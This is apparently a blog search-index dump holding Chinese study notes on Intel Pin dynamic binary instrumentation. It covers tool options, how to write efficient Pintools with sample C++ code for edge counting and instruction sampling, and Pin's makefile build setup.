启用托管平台支持 -short_name 使用最短的RTN名称。 -symbol_path 指定用分号分隔的路径列表，用于搜索以查找符号和行信息。仅在Windows平台下使用。 -slow_asserts 健全性检查 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"6.2 Instrumenting Applications on Intel(R) 64 Architectures IA-32和Intel(R) 64架构的Pin kit是一个组合kit，均包含32-bit和64-bit的版本。这就为复杂的环境提供了极高的可运行性，例如一个稍微有点复杂的运行如下： pin [pin-option]... -t64 \u003c64-bit toolname\u003e -t \u003c32-bit toolname\u003e [tool-options]... -- \u003capplication\u003e [application-option].. 需要注意的是： -t64选项需要用在-t选项的前面 当-t64和-t一起使用时，-t后面跟的时32-bit的tool。不推荐使用不带-t的-t64，因为在这种情况下，当给定32-bit应用程序时，Pin将在不应用任何工具的情况下运行该应用程序。 [tool-option]会同时作用于64-bit和32-bit的tool，并且必须在-t \u003c32-bit toolname\u003e后面进行指定。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"6.3 Injection 选项-injection仅在UNIX平台下可以使用，该选项控制着Pin注入到目标程序进程的方式。 默认情况下，建议使用dynamic模式。在该模式下，使用的是对父进程注入的方式，除非是系统内核不支持。子进程注入方式会创建一个pin的子进程，所以会看到pin进程和目标程序进程同时运行。使用父进程注入方式时，pin进程会在注入完成后退出，所以相对来说比较稳定。在不支持的平台上使用父进程注入方式可能出现意料之外的问题。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7. Writing a Pintool ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7.1 Logging Messages from a Pintool Pin提供了将Pintool的messages写入到文件的机制——LOG() api，在合适的获取message的位置使用即可。默认的文件名为pintool.log，存储路径为当前工作目录，可以使用-logfile选项来改变log文件的路径和名字。 LOG( \"Replacing function in \" + IMG_Name(img) + \"\\n\" ); LOG( \"Address = \" + hexstr( RTN_Address(rtn)) + \"\\n\" ); LOG( \"Image ID = \" + decstr( IMG_Id(img) ) + \"\\n\" ); ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7.2 Performance Considerations When Writing a Pintool Pintool的开发质量会很大程度上决定tool的性能如何，例如在进行插桩时的速度问题。将通过一个例子来介绍一些提高tool性能的技巧。 首先是插桩部分代码： VOID Instruction(INS ins, void *v) { ... if ( [ins is a branch or a call instruction] ) { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } 然后是分析代码： VOID docount2( ADDRINT src, ADDRINT dst, INT32 taken ) { if(!taken) return; COUNTER *pedg = Lookup( src,dst ); pedg-\u003e_count++; } 该工具的目的是计算控制流图中每个控制流变化的边界被遍历的频率。工作原理如下：插桩组件通过调用docount2对每个分支进行插桩。传入的参数为源分支和目标分支以及分支是否被执行。源分支和目标分支代表来控制流边界的源和目的。如果没有执行分支，控制流不会发生改变，因此分析routine会立即返回。如果执行了分支，就使用src和dst参数来查找与此边界相关的计数器，并增加计数器的值。 Shifting Computation for Analysis to Instrumentation Code 在一个典型的应用程序中，大概每5条指令构成一个分支，在这些指令执行时会调用Lookup函数，造成性能下降。我们思考这个过程可以发现，在指令执行时，每条指令只会调用一次插桩代码，但会多次调用分析代码。所以，可以想办法将计算工作从分析代码转移到插桩代码，这样就可以降低调用次数，从而提升性能。 首先，就大多数分支而言，我们可以在Instruction()中找到目标分支。对于这些分支，我们可以在Instruction()内部调用Lookup()而不是docount2()，对于相对较少的间接分支，我们仍然需要使用原来的方法。 因此，我们增加一个新的函数docount，原来的docount2函数保持不变： VOID docount( COUNTER *pedg, INT32 taken ) { if( !taken ) return; pedg-\u003e_count++; } 相应地，修改插桩函数： VOID Instruction(INS ins, void *v) { ... if (INS_IsDirectControlFlow(ins)) { COUNTER *pedg = Lookup( INS_Address(ins), INS_DirectControlFlowTargetAddress(ins) ); INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount, IARG_ADDRINT, pedg, IARG_BRANCH_TAKEN, IARG_END); } else { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } 在插桩函数内部根据不同的情况，执行不同的分析代码，避免对所有类型的指令都笼统地调用性能要求高docount2 函数。 最终实现的完整代码如下： /*! @file * This file contains an ISA-portable PIN tool for tracing instructions */ #include \u003ciostream\u003e#include \u003cfstream\u003e#include \u003cmap\u003e#include \u003cunistd.h\u003e#include \"pin.H\"using std::cerr; using std::endl; using std::map; using std::pair; using std::string; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"edgcnt.out\", \"specify trace file name\"); KNOB\u003c INT32 \u003e KnobFilterByHighNibble(KNOB_MODE_WRITEONCE, \"pintool\", \"f\", \"-1\", \"only instrument instructions with a code address matching the filter\"); KNOB\u003c BOOL \u003e KnobPid(KNOB_MODE_WRITEONCE, \"pintool\", \"i\", \"0\", \"append pid to output\"); /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ static INT32 Usage() { cerr \u003c\u003c \"This pin tool collects an edge profile for an application\\n\"; cerr \u003c\u003c \"The edge profile is partial as it only considers control flow changes (taken\\n\"; cerr \u003c\u003c \"branch edges, etc.). It is the left to the profile consumer to compute the missing counts.\\n\"; cerr \u003c\u003c \"\\n\"; cerr \u003c\u003c \"The pin tool *does* keep track of edges from indirect jumps within, out of, and into\\n\"; cerr \u003c\u003c \"the application. Traps to the OS a recorded with a target of -1.\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ class COUNTER { public: UINT64 _count; // 边界到达的次数，计数器 COUNTER() : _count(0) {} }; typedef enum { ETYPE_INVALID, ETYPE_CALL, ETYPE_ICALL, ETYPE_BRANCH, ETYPE_IBRANCH, ETYPE_RETURN, ETYPE_SYSCALL, ETYPE_LAST } ETYPE; class EDGE { public: ADDRINT _src; ADDRINT _dst; ADDRINT _next_ins; ETYPE _type; // 必须为整数形式 EDGE(ADDRINT s, ADDRINT d, ADDRINT n, ETYPE t) : _src(s), _dst(d), _next_ins(n), _type(t) {} bool operator\u003c(const EDGE\u0026 edge) const { return _src \u003c edge._src || (_src == edge._src \u0026\u0026 _dst \u003c edge._dst); } }; string StringFromEtype(ETYPE etype) { switch (etype) { case ETYPE_CALL: return \"C\"; case ETYPE_ICALL: return \"c\"; case ETYPE_BRANCH: return \"B\"; case ETYPE_IBRANCH: return \"b\"; case ETYPE_RE","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7.3 Eliminating Control Flow 上面新增的docunt()函数的代码十分简洁，极大地提升了性能。除此之外，还可以被Pin内联，进一步避免函数调用的开销。 但是现在的docount()函数中存在控制流，这有可能在进行内联时发生未知的改变。最好的解决办法是去掉函数中的控制流，这样进行内联时可以保证健壮性。 考虑到docount()函数的’taken’参数要么为0，要么为1，所以可以将函数代码修改为如下： VOID docount( COUNTER *pedg, INT32 taken ) { pedg-\u003e_count += taken; } 如此修改后，docunt()函数就可以进行内联了，并且可以保证函数的健壮性。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7.4 Letting Pin Decide Where to Instrument 在某些情况下，我们不关心具体在什么位置进行插桩，只要保证插桩代码位于基本块内部即可。在这种情况下，我们可以将插桩位置的选择权交给Pin自身，Pin可以选择需要最少寄存器进行保存和恢复的插入点，提升性能。 一个样例如下： #include \u003ciostream\u003e#include \u003cfstream\u003e#include \"pin.H\"using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // 记录运行的指令的数量，设置为静态变量方便编译器优化docount函数 static UINT64 icount = 0; // 在每个块之前调用该函数 // 对calls使用fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } // Pin在遇到一个新块时调用，插入对docount 函数的调用 VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对每个bbl插入对docount函数的调用，将指令数量作为参数传递 // IPOINT_ANYWHERE参数允许Pin在bbl内部任意位置插入call以获取最好的性能 // 对call使用fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // 程序退出时调用 VOID Fini(INT32 code, VOID* v) { OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化Pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // 注册插桩函数Trace TRACE_AddInstrumentFunction(Trace, 0); // 注册Fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } 这里IPOINT是一个枚举类型，决定了分析call被插入到什么地方。插入的对象可以是：INS，BBL，TRACE，RTN，其完整可用的值如下： IPOINT_BEFORE：在插桩对象的第一条指令之前插入call，总是有效 IPOINT_AFTER：在插桩对象的最后一条指令的失败路径处插入call 如果是routine（RTN），在所有返回路径处插桩 如果是instruction（INS），仅在INS_IsValidForIpointAfter()函数为真的情况下适用 如果是BBL，仅在BBL_HasFallThrough()函数为真的情况下适用 如果是TRACE，仅在TRACE_HasFallThrough()函数为真的情况下适用 IPOINT_ANYWHERE：在插桩对象的任意位置插入call，不适用INS_InsertCall()和INS_InsertThenCall()函数 IPOINT_TAKEN_BRANCH：在插桩对象的控制流的执行边界处插入call，仅适用于INS_IsValidForIpointTakenBranch()返回真的情况。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7.5 Using Fast Call Linkages 对于一些比较“小”的函数来说，对函数的调用开销有时与函数自身的运算开销基本相同，因此一些编译器会提供一些调用链接优化机制来降低开销。例如，IA-32下的gcc有一个在寄存器中传递参数的regparm属性。 Pin中有一定数量的备用链接，使用PIN_FAST_ANALYSIS_CALL来声明分析函数即可使用，而插桩函数InsertCall则需要使用IARG_FAST_ANALYSIS_CALL。如果二者只更改了一个，那么就可能出现传参错误。例如前面给出的源码例子就使用了fast call linkages： ... ... // 对分析函数使用fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对插桩函数使用fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } ... ... 在对比较复杂的大型函数使用该方法时，效果并不明显，但不会造成性能的下降。 第二个调用链接优化是消除帧指针。如果使用gcc，则推荐加上\"-fomit-frame-pointer\"选项。Pin官方的标准Pintool的makefile包括该选项。与PIN_FAST_ANALYSIS_CALL一样，该选项对“小”函数的效果比较明显。需要注意的是，debugger会根据帧指针来显示堆栈回溯情况，所以如果想调试Pintool的话，就不要设置该选项。如果使用标准的Pintool的makefile来进行变异，则可以通过修改OPT选项来进行改变： make OPT=-O0 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"7.6 Rewriting Conditional Analysis Code to Help Pin Inline Pin通过自动内联没有控制流变化的分析routine来提升插桩性能。但是有很多分析routine是有控制流的，最典型的就是有一个简单的“if-then”的条件语句，它只会执行少量的分析代码，并“then”部分只执行一次。为了将这类的语句转换为常规的没有控制流变化的语句，Pin提供了一些插桩API来重写分析routine。下面是一个重写的例子： 例如我们当前想要实现的一个分析routine的代码如下： // IP-sampling分析routine实现: VOID IpSample(VOID *ip) { --icount; if (icount == 0) { fprintf(trace, \"%p\\n\", ip); icount = N + rand() % M; } } 在原始的IpSample()函数中有一个明显的条件语句，会存在控制流的变化。如何消除该条件控制流的存在呢？ 可以看到分析routine内部其实可以拆解为2部分功能：icount的自减和“if”语句，那么可以使用两个单独的函数实现。而且，前者比后者的执行频率要更高。拆解后的代码如下： /* * IP-sampling分析routine实现: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // 计算icount ADDRINT CountDown() { --icount; return (icount == 0); } // 打印当前指令的IP并且icount被重置为N和N+M中的一个随机数 VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // 准备下次计算 icount = N + rand() % M; } 一个完整的实现消除控制流变化的代码如下： /* source/tools/ManualExamples/isampling.cpp */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \"pin.H\"FILE* trace; const INT32 N = 100000; const INT32 M = 50000; INT32 icount = N; /* * IP-sampling分析routine实现: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // 计算icount ADDRINT CountDown() { --icount; return (icount == 0); } // 打印当前指令的IP并且icount被重置为N和N+M中的一个随机数 VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // 准备下次计算 icount = N + rand() % M; } VOID Instruction(INS ins, VOID* v) { // 每条指令执行后都会调用CountDown() INS_InsertIfCall(ins, IPOINT_BEFORE, (AFUNPTR)CountDown, IARG_END); // 只有当CountDown返回非0值时才会调用PrintIp() INS_InsertThenCall(ins, IPOINT_BEFORE, (AFUNPTR)PrintIp, IARG_INST_PTR, IARG_END); } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool samples the IPs of instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"isampling.out\", \"w\"); if (PIN_Init(argc, argv)) return Usage(); INS_AddInstrumentFunction(Instruction, 0); PIN_StartProgram(); return 0; } 使用条件插桩API INS_InsertIfCall()和INS_InsertThenCall()来告诉Pin只有当CountDown()执行结果非0时，才执行PrintIp()。这样一来，CountDown()函数就可以内联在Pin中，对于没有内联的PrintIp()则只有在满足条件时才会执行一次。 INS_InsertThenCall()插进去的函数只有在INS_InsertIfCall()插进去的函数返回非0值时才会执行。这个功能可以说是一个十分巧妙的功能。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:4:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"8. Building Your Own Tool 在开发自己的Pintool时，可以copy一份example目录， 然后在makefile.rules文件中添加上自己的tool，可以以最简单的MyPinTool为模版。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"8.1 Building a Tool From Within the Kit Directory Tree 如果直接修改MyPinTool，并且没有特殊的编译需求，则直接使用默认配置就好。如果要新增tool或者需要指定特殊的构建标志，则需要修改makeifile.rules文件。 构建YourTool.so(源文件为YourTool.cpp)： make obj-intel64/YourTool.so 如果想编译成IA-32架构，则使用“obj-ia32”替换“obj-intel64”即可。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:5:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"8.2 Building a Tool Out of the Kit Directory Tree copy文件夹MyPinTool到指定位置子，然后编辑makefile.rules文件。 make PIN_ROOT=\u003cpath to Pin kit\u003e obj-intel64/YourTool.so 要更改将创建工具的目录，可以从命令行覆盖 OBJDIR 变量： make PIN_ROOT=\u003cpath to Pin kit\u003e OBJDIR=\u003cpath to output dir\u003e \u003cpath to output dir\u003e/YourTool.so ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:5:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9. Pin’s makefile Infrastructure ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9.1 The Config Directory 目录source/tools/Config中存放了make配置的基本文件，不要轻易修改这些文件，可以基于其中的模版文件进行更新。 下面对其中的几个关键文件进行说明： makefile.config：在include链中第一个应该include的文件。它保存了用户可用的所有相关标识和变量的文档，此外还包括特定于OS的配置文件。 unix.vars：该文件包含makefile使用的一些架构变量和实用程序的Unix定义。 makefile.default.rules：该文件包含默认的make目标、测试用例和构建规则。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9.2 The Test Directories source/tools目录下的每个测试性质的目录中都包含makefile链中的两个文件： makefile：运行make时调用，不要修改。其中保存了makefile链的所有相关配置文件的包含指令，属于通用文件，在所有的测试目录中都是相同的。 makefile.rules：目录特定文件，不同测试目录，文件内容不同。它保存了当前目录的逻辑，应该在目录中构建和运行的所有工具、应用程序和测试等都在该文件中进行定义。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9.3 Adding Tests, Tools and Applications to the makefile 下面介绍如何通过makefile构建二进制程序并运行测试。以下描述的变量都在makefile.rules文件的\"Test targets\"部分进行描述： TOOL_ROOTS：定义工具名称，不带文件扩展名，具体的文件扩展名将由make自动添加，例如YourTools.so； APP_ROOTS：定义应用程序，不带文件扩展名，具体的文件扩展名将由make自动添加，例如YourApp.exe； TEST_ROOTS：定义测试，不要加.test后缀，make会自动添加，例如YourTest.test。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9.4 Defining Build Rules for Tools and Applications 默认使用的构建规则是source/tools/Config/makefile.default.rules，输入为单一的c/cpp文件，生成相同名字的二进制程序。如果输入为多个源文件，且需要自定义构建规则，可以在make.rules文件的\"Build rules\"部分的末尾添加。如下是规则例子： 构建单一源文件且不进行优化： # Build the intermediate object file. $(OBJDIR)YourTool$(OBJ_SUFFIX): YourTool.cpp $(CXX) $(TOOL_CXXFLAGS_NOOPT) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)YourTool$(OBJ_SUFFIX) $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $\u003c $(TOOL_LPATHS) $(TOOL_LIBS) 构建多源文件且进行优化： # Build the intermediate object file. $(OBJDIR)Source1$(OBJ_SUFFIX): Source1.cpp $(CXX) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the intermediate object file. $(OBJDIR)Source2$(OBJ_SUFFIX): Source2.c Source2.h $(CC) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)Source1$(OBJ_SUFFIX) $(OBJDIR)Source2$(OBJ_SUFFIX) Source2.h $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $(^:%.h=) $(TOOL_LPATHS) $(TOOL_LIBS) ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9.5 Defining Test Recipes in makefile.rules 在\"Test recipes\"部分自定义自己的测试需求，例如： YourTest.test: $(OBJDIR)YourTool$(PINTOOL_SUFFIX) $(OBJDIR)YourApp$(EXE_SUFFIX) $(PIN) -t $\u003c -- $(OBJDIR)YourApp$(EXE_SUFFIX) ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"9.6 Useful make Variables and Flags 摘取makefile.config中几个重点的标志进行说明： IN_ROOT：在套件外构建工具时指定Pin套件的位置。 CC: 指定工具的默认c编译器。 CXX：指定工具的默认c++编译器 APP_CC：指定应用程序的默认 c 编译器。如果未定义，APP_CC 将与 CC 相同。 APP_CXX：指定应用程序的默认 c++ 编译器。如果未定义，APP_CXX 将与 CXX 相同。 TARGET：指定默认目标架构，例如交叉编译。 ICC: 使用英特尔编译器构建工具时指定 ICC=1。 DEBUG: 当指定 DEBUG=1 时，在构建工具和应用程序时会生成调试信息。此外，不会执行任何编译和/或链接优化。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:6:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"Pin学习记录第一篇","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"本文是Pin系列学习记录的第一篇，主要是官方文档的相关内容的整理总结。 Pin version: 3.20 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"1. Introduction Pin 是一个动态二进制插桩工具，支持 Linux*， macOS* 和 Windows* 操作系统以及可执行程序。Pin可以通过pintools在程序运行期间动态地向可执行文件的任意位置插入任意代码（C/C++），也可以attach到一个正在运行的进程。 Pin 提供了丰富的 API，可以抽象出底层指令集特性，并允许将进程的寄存器数据等的上下文信息作为参数传递给注入的代码。Pin会自动存储和重置被注入代码覆盖的寄存器，以恢复程序的继续运行。对符号和调试信息也可以设置访问权限。 Pin内置了大量的样例插桩工具的源码，包括基本块分析其、缓存模拟器、指令跟踪生成器等，根据自己的实际需求进行自定义开发也十分方便。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"2. Instrument with Pin ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"1. Pin 对 Pin 的一个最合适的理解是可以将 Pin 当作一个 JIT 编译器，只是它的输入不是字节码，而是可执行文件。Pin 会拦截可执行文件的第一条指令，然后对从该指令开始的后续的指令序列重新“compile”新的代码，然后控制权限转移到新生成的代码。生成的代码与原始代码几乎一致，但是 Pin 会保证在分支退出代码序列时重新获得控制权限。重新获得控制权后，Pin 会基于分支生成更多的代码，然后继续运行。Pin 将所有生成的代码都保存在内存中，这样可以实现代码重用。 在这种 JIT 模式下，执行的是生成的代码，原始代码仅作为参考。当生成代码时，Pin 会给到用户注入自己想执行的代码（插桩）的机会。 Pin 